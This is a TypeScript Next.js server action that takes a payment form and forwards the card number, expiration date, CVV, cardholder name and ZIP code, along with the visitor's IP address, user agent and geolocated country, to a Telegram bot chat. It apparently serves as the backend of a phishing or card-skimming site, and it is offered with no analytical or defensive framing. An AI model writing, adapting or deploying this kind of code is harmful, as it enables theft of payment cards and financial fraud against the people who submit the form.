'use server'

import { FormData } from '../types/formData'
import { headers } from 'next/headers'

async function getCountryFromIP(ip: string) {
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`)
    const data = await response.json()
    return data.country
  } catch (error) {
    console.error('Error fetching country:', error)
    return 'Unknown'
  }
}

export async function sendToTelegram(formData: FormData) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN
  const chatId = process.env.TELEGRAM_CHAT_ID

  if (!botToken || !chatId) {
    console.error('Telegram configuration is missing')
    return { success: false, error: 'Telegram configuration is missing' }
  }

  const headersList = headers()
  const userAgent = await (await headersList).get('user-agent') || 'Unknown'
  const ip = (await (await headersList).get('x-forwarded-for'))?.split(',')[0] || 'Unknown'
  const country = await getCountryFromIP(ip)

  const message = `
New payment information:
Card Number: ${formData.cardNumber}
Expiration Date: ${formData.expirationDate}
CVV: ${formData.cvv}
Name on Card: ${formData.nameOnCard}
ZIP Code: ${formData.zipCode}

User Agent: ${userAgent}
IP Address: ${ip}
Country: ${country}
  `

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram')
    }

    return { success: true }
  } catch (error) {
    console.error('Error sending to Telegram:', error)
    return { success: false, error: 'Failed to send data to Telegram' }
  }
}

